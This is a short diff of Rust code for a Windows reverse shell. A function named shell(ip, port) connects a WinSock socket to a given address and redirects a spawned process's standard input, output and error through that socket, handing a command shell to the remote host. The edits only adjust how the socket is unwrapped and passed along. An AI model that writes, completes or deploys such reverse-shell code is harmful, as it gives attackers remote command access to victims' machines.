@@ -58,7 +58,7 @@ pub fn shell(ip: &str, port: u16) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.connect.html
     let connection_result = unsafe {
         connect(
-            socket,
+            socket.clone().unwrap(),
             &sockaddr_in as *const SOCKADDR_IN as *const SOCKADDR,
             mem::size_of::<SOCKADDR_IN>() as _,
         )
@@ -84,7 +84,7 @@ pub fn shell(ip: &str, port: u16) {
         dwFlags: STARTF_USESTDHANDLES,
         ..Default::default()
     };
-    let sock_handle = &socket as *const SOCKET as *const HANDLE;
+    let sock_handle = &socket.unwrap() as *const SOCKET as *const HANDLE;
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
     startup_info.hStdError = unsafe { *sock_handle };
